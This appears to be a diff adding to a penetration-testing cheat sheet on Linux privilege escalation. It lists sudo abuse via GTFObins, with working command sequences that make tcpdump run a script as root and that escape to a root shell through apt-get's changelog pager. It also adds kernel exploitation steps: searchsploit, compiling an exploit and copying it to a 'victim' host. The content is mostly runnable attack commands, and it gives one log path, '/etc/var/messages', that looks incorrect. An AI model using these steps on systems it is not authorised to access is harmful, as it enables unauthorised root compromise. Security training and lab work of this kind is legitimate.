@@ -99,6 +99,33 @@ ls -asl /usr/bin/some_binary
 
 ## Sudo
 
+Check the commands usable with `sudo`:
+```
+sudo -l
+```
+then try to elevate privileges with them with [GTFObins](https://gtfobins.github.io/). For example:
+- `tcpdump`: https://gtfobins.github.io/gtfobins/tcpdump/#sudo
+```
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+```
+Check possible error messages in `/etc/var/messages`.
+- `apt-get`: https://gtfobins.github.io/gtfobins/apt-get/#sudo
+```
+hackeduser@hackedtarget $: sudo apt-get changelog apt
+```
+and in `less`:
+```
+!/bin/sh
+```
+Check the escalation with the `id` command.
+
+## Kernel vulnerabilities
+
+Retrieve the kernel version and try to find an exploit on [exploitdb](https://www.exploit-db.com/):
 ```
 searchsploit -u
 searchsploit "Linux kernel 4.4.0 privilege escalation"
@@ -107,7 +134,4 @@ gcc num.c
 scp a.out victim@IP:
 ./a.out
 ```
-
-
-
 
